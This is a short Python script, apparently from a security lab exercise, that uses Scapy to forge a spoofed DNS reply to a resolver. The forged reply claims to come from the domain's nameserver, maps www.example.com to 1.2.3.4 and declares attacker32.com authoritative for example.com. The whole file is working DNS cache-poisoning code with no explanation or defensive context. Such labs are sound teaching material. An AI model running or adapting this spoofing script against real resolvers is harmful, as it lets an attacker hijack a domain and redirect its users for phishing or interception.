#!/bin/env python3

from scapy.all import *

name = "www.example.com"
domain = "example.com"
ns = "attacker32.com"

Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname = name,
               type   = 'A', 
               rdata  = '1.2.3.4', 
               ttl    = 259200)
NSsec  = DNSRR(rrname = domain, 
               type   = 'NS', 
               rdata  = ns,
               ttl    = 259200)
dns    = DNS(id  = 0xAAAA, aa=1, rd=1, qr=1, 
             qdcount = 1, qd = Qdsec,
             ancount = 1, an = Anssec, 
             nscount = 1, ns = NSsec,arcount=0)

ip  = IP (dst = '10.9.0.53', src = '93.184.216.34')

udp = UDP(dport = 33333, sport = 53,  chksum=0)
Replypkt = ip/udp/dns
send(Replypkt)
